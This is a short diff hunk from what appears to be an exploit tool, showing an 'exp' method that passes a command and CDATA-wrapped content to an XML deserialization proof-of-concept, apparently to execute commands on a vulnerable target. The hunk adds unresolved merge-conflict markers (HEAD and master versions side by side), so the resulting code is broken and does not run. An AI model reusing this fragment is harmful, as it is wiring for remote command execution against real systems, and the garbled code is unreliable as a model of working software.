@@ -10,5 +10,10 @@ class EXP:
 
 
     def exp(self, cmd, content=""):
+<<<<<<< HEAD
         poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
         return poc.xml_deserialize(self.vuln.url, cmd, "<![CDATA[  %s  ]]>" % content, "exp")
+=======
+        poc = POC(self.vuln)
+        return poc.xml_deserialize(cmd, "<![CDATA[  %s  ]]>" % content, "exp")
+>>>>>>> master
